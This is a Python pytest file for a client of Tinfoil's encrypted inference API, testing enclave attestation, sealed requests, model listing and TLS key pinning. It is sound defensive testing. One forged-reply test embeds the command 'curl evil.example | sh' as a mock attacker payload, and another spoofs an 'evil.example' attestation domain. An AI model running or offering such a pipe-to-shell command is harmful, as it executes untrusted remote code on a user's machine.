"""Tinfoil's own API, end-to-end encrypted (providers/tinfoil_direct.py).

Offline. The fake enclave of tests/test_private_mode.py holds a real X25519
key and speaks EHBP, so sealed round trips seal and open real ciphertext. The
attestation runs Tinfoil's real SDK over a capture of Tinfoil's public bundle
(tests/data/tinfoil/bundle.json: GET https://atc.tinfoil.sh/attestation, Nov
14 2026, keyless): the SEV-SNP report verified against AMD's chain with the
bundle's VCEK and the enclave certificate's binding, at the capture's moment;
only Sigstore's check of the release (it needs Sigstore's TUF root, online) is
stood in for. tests/data/tinfoil/models.json is GET
https://inference.tinfoil.sh/v1/models the same day; router_release.json and
hardware_release.json are the two releases the SDK reads, trimmed. The TLS
pin is checked against a real TLS server on this computer, direct and through
a CONNECT proxy.
"""

from __future__ import annotations

import base64
import datetime as dt
import json
import select
import socket
import ssl
import threading
from pathlib import Path

import httpx
import pytest

pytest.importorskip("ehbp")

from ehbp import EHBPTransport  # noqa: E402

from sealedlore.engine.pricing import parse_price  # noqa: E402
from sealedlore.engine.reasoning import config_reasoning  # noqa: E402
from sealedlore.models.config import (  # noqa: E402
    TINFOIL_BASE_URL,
    Config,
    ModelReasoning,
    ProviderConfig,
)
from sealedlore.providers import make_chat_provider  # noqa: E402
from sealedlore.providers.base import ProviderError, StreamCompleted, TextDelta  # noqa: E402
from sealedlore.providers.privacy import TINFOIL, privacy_of  # noqa: E402
from sealedlore.providers.sealed_ehbp import (  # noqa: E402
    CACHE_SECRET_FIELD,
    ROUTER_REPO,
    Enclave,
    ModelRetired,
    Verified,
    _NonEmptyBodyTransport,
    attestation_record,
)
from sealedlore.providers.tinfoil_direct import (  # noqa: E402
    ATC_URL,
    DIRECT_FIELDS,
    PIN_MISMATCH,
    Listing,
    TinfoilDirect,
    TlsPin,
    TlsPinMismatch,
    chosen_effort,
    direct_verify,
    listing_entries,
    spki_sha256,
    within,
)
from tests.test_private_mode import SECRET_WORDS, FakeEnclave, request, sse  # noqa: E402

DATA = Path(__file__).resolve().parent / "data"
BUNDLE = json.loads((DATA / "tinfoil" / "bundle.json").read_text(encoding="utf-8"))
MODELS = json.loads((DATA / "tinfoil" / "models.json").read_text(encoding="utf-8"))
RELEASE = json.loads((DATA / "tinfoil" / "router_release.json").read_text(encoding="utf-8"))
CONTRACT = json.loads((DATA / "tinfoil_direct_contract.json").read_text(encoding="utf-8"))
# What the capture's report binds (verified below): the router's TLS key.
ATTESTED_TLS_KEY = "e5db636af31d94d74871ab63d5e62ac2d34beab02032629dac2685149b7d99d7"
HOST = "inference.tinfoil.sh"


def listing(seen: list[httpx.Request] | None = None, data=MODELS) -> Listing:
    def handler(req: httpx.Request) -> httpx.Response:
        if seen is not None:
            seen.append(req)
        return httpx.Response(200, json=data)

    return Listing(TINFOIL_BASE_URL, client=httpx.Client(transport=httpx.MockTransport(handler)))


def record(fake: FakeEnclave, *, enclave: str = HOST, tls: str = ATTESTED_TLS_KEY) -> Verified:
    return Verified(
        hpke_public_key=fake.public_hex,
        enclave=enclave,
        tls_public_key=tls,
        attestation=attestation_record(
            enclave=enclave,
            hardware="AMD SEV-SNP",
            measurement="07c3b78a",
            release_digest="cb88bff7" * 8,
            release_tag="v0.0.176",
            latest_release="",
            latest_checked=True,
            hpke_public_key=fake.public_hex,
            service=TINFOIL,
        ),
    )


@pytest.fixture
def fake() -> FakeEnclave:
    enclave = FakeEnclave()
    enclave.private_header = False  # Tinfoil's reply carries none of NanoGPT's
    return enclave


@pytest.fixture
def direct(fake):
    attested: list[str] = []

    def verifier(bundle_url: str, secret: str) -> Verified:
        attested.append(bundle_url)
        return record(fake)

    provider = TinfoilDirect(
        ProviderConfig(name="Tinfoil", base_url=TINFOIL_BASE_URL, api_key="tk-test", api="tinfoil"),
        enclave=Enclave(ATC_URL, verifier=verifier),
        transport_factory=lambda key, route=None: EHBPTransport.from_public_key_hex(
            key, inner=httpx.MockTransport(fake.handler)
        ),
        listing=listing(),
    )
    # The mock transport makes no TLS (nor any trace): the pin's own tests
    # are below, against a real TLS server.
    return provider, attested


def text_of(events) -> str:
    return "".join(e.text for e in events if isinstance(e, TextDelta))


# --- the attestation ------------------------------------------------------------------


def verify_report():
    from tinfoil.attestation.attestation import Document
    from tinfoil.attestation.types import PredicateType

    report = BUNDLE["enclaveAttestationReport"]
    document = Document(format=PredicateType(report["format"]), body=report["body"])
    return document, document.verify(vcek_der=base64.b64decode(BUNDLE["vcek"]))


def test_the_captured_bundle_binds_the_tls_key_the_pin_checks():
    """Offline, at the capture's moment: AMD's chain signs the report, the
    report binds the TLS key and the HPKE key, and the enclave certificate
    (the one inference.tinfoil.sh served) is for the domain, carries the HPKE
    key and the report's hash, and its key is the attested TLS key: what the
    pin compares, in the form the pin computes it."""
    from cryptography import x509
    from cryptography.hazmat.primitives.serialization import Encoding
    from tinfoil.attestation.bundle import verify_certificate

    document, verification = verify_report()
    assert verification.public_key_fp == ATTESTED_TLS_KEY
    assert verify_certificate(
        BUNDLE["enclaveCert"], HOST, document, verification.hpke_public_key
    ) == (verification.hpke_public_key)
    certificate = x509.load_pem_x509_certificate(BUNDLE["enclaveCert"].encode())
    assert spki_sha256(certificate.public_bytes(Encoding.DER)) == ATTESTED_TLS_KEY


@pytest.fixture
def sdk(monkeypatch):
    """Tinfoil's real SDK on the captured bundle: nothing but Sigstore's
    release check stood in for, and every way to the network shut."""
    import socket as sockets
    import types

    import tinfoil.attestation.bundle
    import tinfoil.client
    import tinfoil.github

    from sealedlore.providers import sdk_guard

    _document, verification = verify_report()
    fetched: list[str] = []
    bundle = dict(BUNDLE)

    class Reply:
        status_code = 200

        def raise_for_status(self) -> None:
            return None

        def json(self):
            return bundle

    def get(url, **_kwargs):
        fetched.append(url)
        return Reply()

    def post(url, json=None, **_kwargs):
        # ATC's bundle for one named enclave (the SDK's POST): as live, the
        # bundle of the router asked for.
        fetched.append(("POST", url, json))
        return Reply()

    def nowhere(*_args, **_kwargs):
        raise AssertionError("a router lookup, or plain urllib: never reached")

    class Release:
        tag, digest = RELEASE["tag_name"], BUNDLE["digest"]

    # The name the SDK's bundle fetch reads at call time (once the guard has run
    # in this process it is the guard's stand-in for requests, not requests).
    monkeypatch.setattr(
        tinfoil.attestation.bundle, "requests", types.SimpleNamespace(get=get, post=post)
    )
    # And nothing else gets out: no socket connects during the test.
    monkeypatch.setattr(sockets.socket, "connect", nowhere)
    monkeypatch.setattr(sockets, "create_connection", nowhere)
    monkeypatch.setattr(tinfoil.client, "get_router_address", nowhere)
    monkeypatch.setattr("urllib.request.urlopen", nowhere)
    monkeypatch.setattr(
        tinfoil.client, "verify_attestation", lambda *a, **k: verification.measurement
    )
    monkeypatch.setattr(tinfoil.github, "fetch_latest_release", lambda repo: Release())
    monkeypatch.setattr(sdk_guard, "guard", lambda *a, **k: [])
    return bundle, fetched


def test_direct_attestation_takes_atcs_bundle_and_never_looks_a_router_up(sdk):
    """ATC's bundle is asked for by the endpoint's own host: a plain GET
    served either of Tinfoil's two routers' bundles (live, Nov 15 2026,
    router-0.tinfoil.sh one time in four, a TLS key of its own), and the
    attestation was then refused as another host's."""
    bundle, fetched = sdk
    verified = direct_verify(HOST, ATC_URL, "s" * 64)
    assert fetched == [("POST", ATC_URL + "/attestation", {"enclaveUrl": f"https://{HOST}"})]
    assert verified.enclave == HOST and verified.tls_public_key == ATTESTED_TLS_KEY
    attestation = verified.attestation
    assert attestation.service == TINFOIL and attestation.attested == "router"
    assert attestation.encrypted and attestation.release_tag == "v0.0.176"
    assert attestation.latest_release == "" and attestation.hardware == "AMD SEV-SNP"


def test_a_bundle_for_another_host_is_refused(sdk):
    bundle, _fetched = sdk
    # This endpoint's address isn't the enclave the bundle attests.
    with pytest.raises(ProviderError, match="attestation is for inference.tinfoil.sh, not router"):
        direct_verify("router-0.tinfoil.sh", ATC_URL, "s" * 64)
    # A bundle naming another domain: its certificate isn't for it (the SDK's step 4).
    bundle["domain"] = "evil.example"
    with pytest.raises(ValueError, match="not valid for domain"):
        direct_verify("evil.example", ATC_URL, "s" * 64)
    with pytest.raises(ProviderError, match="couldn't be attested: certificate not valid"):
        Enclave(ATC_URL, verifier=lambda url, secret: direct_verify(HOST, url, secret)).current()


def test_an_attestation_naming_no_tls_key_is_refused(fake):
    with pytest.raises(ProviderError, match="no TLS key"):
        direct_verify(HOST, ATC_URL, "s", verify=lambda *a, **k: record(fake, tls=""))


def test_the_whole_attempt_has_its_time():
    release = threading.Event()

    def slow():
        release.wait(5)
        raise AssertionError("never used")

    with pytest.raises(ProviderError, match="wasn't attested within"):
        within(0.05, slow)
    release.set()
    assert within(1, lambda: "done") == "done"
    with pytest.raises(KeyError):
        within(1, lambda: {}["x"])


# --- one request ----------------------------------------------------------------------


def test_the_prompt_goes_sealed_to_tinfoils_own_api_with_nothing_of_nanogpts(fake, direct):
    provider, attested = direct
    events = list(provider.stream(request("glm-5-3", temperature=0.6)))
    assert text_of(events) == "Hello there."
    completed = events[-1]
    assert isinstance(completed, StreamCompleted) and completed.sealed
    assert attested == [ATC_URL]
    assert SECRET_WORDS.encode() not in fake.wire[0]
    body = fake.requests[0]
    assert body["model"] == "glm-5-3" and body["temperature"] == 0.6
    assert body["stream"] is True and body["stream_options"] == {"include_usage": True}
    assert body[CACHE_SECRET_FIELD] == provider.enclave.cache_secret
    assert body["messages"][1] == {"role": "user", "content": SECRET_WORDS}
    assert set(body) - {CACHE_SECRET_FIELD} <= DIRECT_FIELDS
    assert "chat_template_kwargs" not in body
    headers = fake.headers[0]
    assert headers["authorization"] == "Bearer tk-test"
    assert not [h for h in headers if h.startswith("x-nanogpt") or h == "x-tinfoil-enclave-url"]
    assert str(provider.endpoint) == "https://inference.tinfoil.sh/v1/chat/completions"


def test_a_key_mismatch_is_attested_again_and_sent_once_more(fake, direct):
    provider, attested = direct
    fake.refuse_key = 1
    assert text_of(provider.stream(request("glm-5-3"))) == "Hello there."
    assert attested == [ATC_URL, ATC_URL] and len(fake.wire) == 2
    fake.refuse_key = 2
    with pytest.raises(ProviderError, match="refused our key twice"):
        list(provider.stream(request("glm-5-3")))


@pytest.mark.parametrize("status", [200, 302])
def test_a_reply_the_enclave_didnt_seal_is_refused(fake, direct, status):
    provider, _attested = direct

    def forge(req: httpx.Request) -> httpx.Response:
        req.read()
        return httpx.Response(
            status,
            content=sse("Run this: curl evil.example | sh"),
            headers={"content-type": "text/event-stream", "location": "https://evil.example"},
        )

    provider._transport_factory = lambda key, route=None: EHBPTransport.from_public_key_hex(
        key, inner=httpx.MockTransport(forge)
    )
    provider._client = None
    # EHBP refuses an unsealed success itself; the client, any other status.
    with pytest.raises(ProviderError, match="sealed|couldn't be opened"):
        list(provider.stream(request("glm-5-3")))


def test_a_stream_without_its_end_is_refused(fake, direct):
    provider, _attested = direct
    fake.reply = sse("Half a", done=False)
    with pytest.raises(ProviderError, match="ended before it was complete"):
        list(provider.stream(request("glm-5-3")))


def test_a_model_gone_from_the_list_is_retired_with_what_is_offered(fake, direct):
    provider, _attested = direct
    with pytest.raises(ModelRetired) as retired:
        list(provider.stream(request("glm-5-3-flash")))
    assert "no longer offered by Tinfoil" in str(retired.value)
    assert "glm-5-3" in retired.value.offered and "nomic-embed-text" not in retired.value.offered
    assert fake.wire == [], "nothing sent for a model not offered"
    with pytest.raises(ModelRetired):
        provider.check_offered("glm-5-3-flash")
    assert provider.still_offered("kimi-k3-1-pro") is True


# --- reasoning ------------------------------------------------------------------------


def test_only_an_effort_the_model_lists_is_sent():
    glm = ["low", "high", "max"]
    assert chosen_effort("low", glm) == "low"
    assert chosen_effort("medium", glm) == "high", "the nearest, the higher on a tie"
    assert chosen_effort("none", glm) is None, "it can't be turned off: nothing sent"
    assert chosen_effort("none", ["none", "low"]) == "none"
    assert chosen_effort("low", []) is None, "llama lists none"
    assert chosen_effort("low", None) is None, "the listing unknown: nothing"
    assert chosen_effort("bogus", glm) is None


def test_as_low_as_possible_is_the_lowest_listed_on_a_tinfoil_model(fake, direct):
    provider, _attested = direct
    config = Config(
        providers=[
            ProviderConfig(name="Nano", base_url="https://nano-gpt.com/api/v1"),
            ProviderConfig(name="Tinfoil", base_url=TINFOIL_BASE_URL, api="tinfoil"),
        ],
        active_provider_name="Nano",
    )
    entries = provider.fetch_model_prices()
    for model, efforts in (("glm-5-3", "low"), ("deepseek-v4-1-flash", "none")):
        config.model_reasoning[f"Tinfoil::{model}"] = ModelReasoning(
            efforts=entries[model]["reasoning_efforts"]
        )
        sent = config_reasoning(config, "story", f"Tinfoil::{model}")
        assert sent.effort == efforts, model
    assert privacy_of("Tinfoil::glm-5-3", config).service == TINFOIL
    # On the wire, the effort the session asks for, only as listed.
    events = list(provider.stream(request("glm-5-3", reasoning={"enabled": True, "effort": "low"})))
    assert text_of(events) == "Hello there."
    assert fake.requests[-1]["reasoning_effort"] == "low"
    list(provider.stream(request("llama3-3-70b", reasoning={"enabled": True, "effort": "low"})))
    assert "reasoning_effort" not in fake.requests[-1], "llama lists no effort"


# --- the listing ----------------------------------------------------------------------


def test_the_listing_is_fetched_without_the_key_and_read_as_the_apps_shape():
    seen: list[httpx.Request] = []
    entries = listing(seen).fetch()
    assert [str(r.url) for r in seen] == [TINFOIL_BASE_URL + "/models"]
    assert "authorization" not in seen[0].headers, "the one unsealed request: no key"
    assert sorted(entries) == [
        "deepseek-v4-1-flash",
        "gemma4-31b",
        "glm-5-3",
        "gpt-oss-120b",
        "kimi-k3-1-pro",
        "llama3-3-70b",
    ], "chat models only"
    glm = entries["glm-5-3"]
    price = parse_price(glm)
    assert (price.prompt, price.completion, price.cache_read) == (1.8, 5.75, 0.45)
    assert glm["context_length"] == 1048576 and glm["reasoning_efforts"] == ["low", "high", "max"]
    assert glm["capabilities"]["reasoning"] is True
    assert parse_price(entries["llama3-3-70b"]).cache_read is None
    assert listing_entries({"data": [{"id": 3, "type": "chat"}, "x"]}) == {}


def test_the_client_reaches_tinfoil_whatever_the_plain_clients_refuse(fake, direct):
    """A plain client refuses Tinfoil's host (tests/test_privacy.py); its own
    sealing client is what make_chat_provider builds for it."""
    settings = ProviderConfig(name="Tinfoil", base_url=TINFOIL_BASE_URL, model="glm-5-3")
    assert isinstance(make_chat_provider(settings), TinfoilDirect)
    provider, _attested = direct
    assert text_of(provider.stream(request("glm-5-3"))) == "Hello there."


def test_the_client_stays_within_the_reviewed_contract():
    """tests/data/tinfoil_direct_contract.json records what was read of
    Tinfoil's side on Nov 14 2026 (SealedLoreDocs/tools/tinfoil_check compares
    it with PyPI, the router's releases and the live listing)."""
    import importlib.metadata

    from tinfoil.attestation.bundle import ATTESTATION_BUNDLE_ENDPOINT

    from sealedlore.providers.sealed_ehbp import REQUIRED_STEPS

    assert importlib.metadata.version("tinfoil") == CONTRACT["sdk"]["version"]
    assert importlib.metadata.version("tinfoil-ehbp") == CONTRACT["sdk"]["ehbp_version"]
    assert ROUTER_REPO == CONTRACT["router_repo"]
    assert ATC_URL == CONTRACT["atc"] and TINFOIL_BASE_URL == CONTRACT["base_url"]
    assert ATTESTATION_BUNDLE_ENDPOINT == CONTRACT["paths"]["attestation"]
    assert TINFOIL_BASE_URL.endswith("/v1")
    assert DIRECT_FIELDS <= set(CONTRACT["body_fields"])
    assert CACHE_SECRET_FIELD == CONTRACT["cache_secret_field"]
    assert list(REQUIRED_STEPS) == CONTRACT["verification_steps"]
    chat = [m for m in MODELS["data"] if m.get("type") == CONTRACT["chat_type"]]
    assert {k for m in chat for k in m} <= set(CONTRACT["listing_fields"])
    read = {"id", "name", "description", "type", "supported_efforts", "reasoning"}
    read |= {"multimodal", "context_window", "pricing"}
    assert read <= set(CONTRACT["listing_fields"]), "every field the client reads is recorded"


# --- the TLS pin ----------------------------------------------------------------------


def certificate(tmp_path: Path, host: str = "localhost") -> tuple[Path, Path, str]:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, host)])
    now = dt.datetime.now(dt.UTC)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - dt.timedelta(days=1))
        .not_valid_after(now + dt.timedelta(days=1))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    cert_path, key_path = tmp_path / "cert.pem", tmp_path / "key.pem"
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
    )
    return cert_path, key_path, spki_sha256(cert.public_bytes(serialization.Encoding.DER))


class TlsServer:
    """A TLS server on this computer that keeps every byte it is sent after
    its handshake, and answers whatever came with a 400."""

    def __init__(self, cert: Path, key: Path) -> None:
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(cert, key)
        self.listener = socket.create_server(("127.0.0.1", 0))
        self.port = self.listener.getsockname()[1]
        self.received: list[bytes] = []
        self.handshakes = 0
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self) -> None:
        while True:
            try:
                raw, _address = self.listener.accept()
            except OSError:
                return
            try:
                with self.context.wrap_socket(raw, server_side=True) as conn:
                    self.handshakes += 1
                    conn.settimeout(5)
                    data = b""
                    while b"\r\n\r\n" not in data:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        data += chunk
                    if data:
                        # Read what the body sends, then answer.
                        conn.settimeout(0.3)
                        try:
                            while chunk := conn.recv(65536):
                                data += chunk
                        except (TimeoutError, OSError):
                            pass
                    self.received.append(data)
                    if data:
                        conn.sendall(b"HTTP/1.1 400 Bad Request\r\ncontent-length: 0\r\n\r\n")
            except (OSError, ssl.SSLError):
                self.received.append(b"")

    def close(self) -> None:
        self.listener.close()


class ConnectProxy:
    """An http proxy on this computer that tunnels CONNECT, and keeps the
    CONNECT lines it was asked."""

    def __init__(self) -> None:
        self.listener = socket.create_server(("127.0.0.1", 0))
        self.port = self.listener.getsockname()[1]
        self.asked: list[bytes] = []
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self) -> None:
        while True:
            try:
                client, _address = self.listener.accept()
            except OSError:
                return
            threading.Thread(target=self._tunnel, args=(client,), daemon=True).start()

    def _tunnel(self, client: socket.socket) -> None:
        head = b""
        while b"\r\n\r\n" not in head:
            chunk = client.recv(4096)
            if not chunk:
                return
            head += chunk
        line = head.split(b"\r\n", 1)[0]
        self.asked.append(line)
        _method, target, _version = line.split(b" ", 2)
        host, port = target.decode().rsplit(":", 1)
        upstream = socket.create_connection(
            ("127.0.0.1" if host == "localhost" else host, int(port))
        )
        client.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
        sockets = [client, upstream]
        try:
            while True:
                ready, _w, _x = select.select(sockets, [], [], 5)
                if not ready:
                    return
                for sock in ready:
                    data = sock.recv(65536)
                    if not data:
                        return
                    (upstream if sock is client else client).sendall(data)
        finally:
            client.close()
            upstream.close()

    def close(self) -> None:
        self.listener.close()


@pytest.fixture
def tls(tmp_path):
    cert, key, fingerprint = certificate(tmp_path)
    server = TlsServer(cert, key)
    trusted = ssl.create_default_context(cafile=str(cert))
    yield server, trusted, fingerprint
    server.close()


def pinned(fake: FakeEnclave, server, trusted, tls_key: str, proxy: str | None = None):
    attested: list[str] = []

    def verifier(bundle_url: str, secret: str) -> Verified:
        attested.append(bundle_url)
        return record(fake, enclave="localhost", tls=tls_key)

    base = f"https://localhost:{server.port}/v1"
    provider = TinfoilDirect(
        ProviderConfig(name="Tinfoil", base_url=base, api_key="tk-test", api="tinfoil"),
        enclave=Enclave(ATC_URL, verifier=verifier),
        transport_factory=lambda key, route=None: EHBPTransport.from_public_key_hex(
            key,
            inner=_NonEmptyBodyTransport(
                proxy=proxy, verify=trusted, limits=httpx.Limits(max_keepalive_connections=0)
            ),
        ),
        listing=listing(data={"data": [{"id": "glm-5-3", "type": "chat"}]}),
    )
    return provider, attested


def test_a_tls_key_that_isnt_the_attested_one_gets_not_one_byte(fake, tls):
    server, trusted, _fingerprint = tls
    provider, attested = pinned(fake, server, trusted, "00" * 32)
    with pytest.raises(TlsPinMismatch) as refused:
        list(provider.stream(request("glm-5-3")))
    assert str(refused.value) == PIN_MISMATCH
    server.thread.join(0.5)
    assert server.handshakes == 1 and server.received == [b""], "the request never left"
    list_attested = len(attested)
    with pytest.raises(TlsPinMismatch):
        list(provider.stream(request("glm-5-3")))
    assert len(attested) == list_attested + 1, "attested again before the next try"


def test_the_attested_tls_key_lets_the_request_go(fake, tls):
    server, trusted, fingerprint = tls
    provider, _attested = pinned(fake, server, trusted, fingerprint)
    with pytest.raises(ProviderError, match="400|disconnected"):
        list(provider.stream(request("glm-5-3")))
    assert server.received and server.received[0].startswith(b"POST /v1/chat/completions ")
    assert SECRET_WORDS.encode() not in server.received[0], "sealed, headers and all"


def test_the_pin_holds_through_a_connect_proxy(fake, tls):
    server, trusted, fingerprint = tls
    proxy = ConnectProxy()
    try:
        provider, _attested = pinned(
            fake, server, trusted, fingerprint, proxy=f"http://127.0.0.1:{proxy.port}"
        )
        with pytest.raises(ProviderError, match="400|disconnected"):
            list(provider.stream(request("glm-5-3")))
        assert proxy.asked == [f"CONNECT localhost:{server.port} HTTP/1.1".encode()]
        assert server.received[-1].startswith(b"POST /v1/chat/completions ")
        before = len(server.received)
        wrong, _attested = pinned(
            fake, server, trusted, "11" * 32, proxy=f"http://127.0.0.1:{proxy.port}"
        )
        with pytest.raises(TlsPinMismatch):
            list(wrong.stream(request("glm-5-3")))
        server.thread.join(0.5)
        assert server.received[before:] == [b""], "the request never left the tunnel"
    finally:
        proxy.close()


def test_no_request_goes_on_a_connection_whose_key_wasnt_checked():
    pin = TlsPin(HOST, ATTESTED_TLS_KEY)

    class Connect:
        method = b"CONNECT"

    class Post:
        method = b"POST"

    pin("http11.send_request_headers.started", {"request": Connect()})  # the proxy's
    with pytest.raises(TlsPinMismatch, match="wasn't checked"):
        pin("http11.send_request_headers.started", {"request": Post()})
    # A proxy's own TLS (an https proxy) isn't the host's: not checked against it.
    pin("connection.start_tls.started", {"server_hostname": "proxy.example"})
    pin("connection.start_tls.complete", {"return_value": None})
    assert not pin.checked
    pin("proxy.start_tls.started", {"server_hostname": HOST})
    with pytest.raises(TlsPinMismatch):
        pin("proxy.start_tls.complete", {"return_value": None})


def test_a_provider_with_no_pin_sends_nothing(fake):
    provider = TinfoilDirect(ProviderConfig(name="Tinfoil", base_url=TINFOIL_BASE_URL))
    with pytest.raises(TlsPinMismatch):
        provider._trace("http11.send_request_headers.started", {"request": None})


def test_two_requests_at_once_never_go_on_each_others_pin(fake, tmp_path):
    """Each request's pin is its own: B, whose handshake was never checked,
    must not go on the strength of A's (they shared the provider's pin, so
    behind an https proxy B's host handshake went unchecked), and A is not
    stopped by B's refusal."""
    import threading
    from concurrent.futures import ThreadPoolExecutor

    from cryptography import x509
    from cryptography.hazmat.primitives.serialization import Encoding

    cert_path, _key, fingerprint = certificate(tmp_path, host=HOST)
    der = x509.load_pem_x509_certificate(cert_path.read_bytes()).public_bytes(Encoding.DER)

    class Ssl:
        def getpeercert(self, binary: bool) -> bytes:
            return der

    class Tls:
        """What httpcore's start_tls hands back: the attested key's certificate."""

        def get_extra_info(self, name: str):
            return Ssl() if name == "ssl_object" else None

    class Post:
        method = b"POST"

    lock = threading.Lock()
    arrived: list[str] = []
    b_here, a_checked, b_done = threading.Event(), threading.Event(), threading.Event()
    reached: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        trace = request.extensions["trace"]
        with lock:
            which = "A" if not arrived else "B"
            arrived.append(which)
        try:
            if which == "A":
                assert b_here.wait(5), "B never prepared"
                trace("connection.start_tls.started", {"server_hostname": HOST})
                trace("connection.start_tls.complete", {"return_value": Tls()})
                a_checked.set()
                assert b_done.wait(5), "B never finished"
            else:
                b_here.set()
                assert a_checked.wait(5), "A never shook hands"
            # No handshake of B's own: only A's was checked.
            trace("http11.send_request_headers.started", {"request": Post()})
        finally:
            if which == "B":
                b_done.set()
        reached.append(which)
        return fake.handler(request)

    provider = TinfoilDirect(
        ProviderConfig(name="Tinfoil", base_url=TINFOIL_BASE_URL, api_key="tk", api="tinfoil"),
        enclave=Enclave(ATC_URL, verifier=lambda url, secret: record(fake, tls=fingerprint)),
        transport_factory=lambda key, route=None: EHBPTransport.from_public_key_hex(
            key, inner=httpx.MockTransport(handler)
        ),
        listing=listing(),
    )
    provider._get_client()  # attested before either goes
    fake.reply = sse("The door opens.")

    def ask() -> str:
        try:
            return text_of(provider.stream(request("glm-5-3")))
        except TlsPinMismatch:
            return "refused"

    with ThreadPoolExecutor(2) as pool:
        first = pool.submit(ask)
        second = pool.submit(ask)
        results = sorted([first.result(10), second.result(10)])
    assert results == ["The door opens.", "refused"], results
    assert reached == ["A"], "B never went on A's check"
    assert not hasattr(provider, "_pin"), "nothing of a pin kept on the provider"
